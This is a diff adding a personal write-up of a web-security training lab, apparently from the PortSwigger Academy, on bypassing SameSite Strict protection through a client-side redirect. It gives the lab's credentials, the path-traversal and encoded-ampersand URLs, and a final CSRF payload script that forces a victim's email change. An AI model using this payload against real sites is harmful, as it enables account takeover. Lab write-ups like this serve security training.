@@ -1,0 +1,43 @@
+Lab #8 - SameSite Strict bypass via client-side redirect
+
+Vulnerability  - This lab's change email function is vulnerable to CSRF.
+
+Goal - To solve the lab, perform a CSRF attack that changes the victim's email address. You should use the provided exploit server to host your attack.
+
+Credentials - wiener:peter
+
+Analysis:
+- Log in with credentials - wiener:peter
+- When ost a comment => the response like this: Your comment has been submitted. You will be redirected momentarily.
+and we redirect to /post/{id} again. 
+- the response has a script like this:
+<script>redirectOnConfirmation('/post');</script>
+and redirectOnConfirmation() function:
+redirectOnConfirmation = (blogPath) => {
+    setTimeout(() => {
+        const url = new URL(window.location);
+        const postId = url.searchParams.get("postId");
+        window.location = blogPath + '/' + postId;
+    }, 3000);
+}
+
+- when make a request to https://0a2d000d04770852835991e100b50047.web-security-academy.net/post/comment/confirmation?postId=/my-account/change-email?email=a@gmail.com
+=> Not found /post/my-account/change-email 
+=> this website does not check type of postId
+
+- using path traversal to redirect to /my-account/change-email
+https://0a2d000d04770852835991e100b50047.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?email=a@gmail.com
+=> error: "Missing parameter: 'submit'" 
+
+- make a request: https://0a2d000d04770852835991e100b50047.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?submit=1&email=a@gmail.com
+=> error: "Missing parameter: 'email'"
+- encode &:https://0a2d000d04770852835991e100b50047.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?submit=1%26email=a@gmail.com
+=> SUCCESSFULLY
+
+Solution:
+- make an HTML file and upload to exploit server:
+
+<script>
+    document.location = "https://0a2d000d04770852835991e100b50047.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?submit=1%26email=a@gmail.com"
+</script>
+
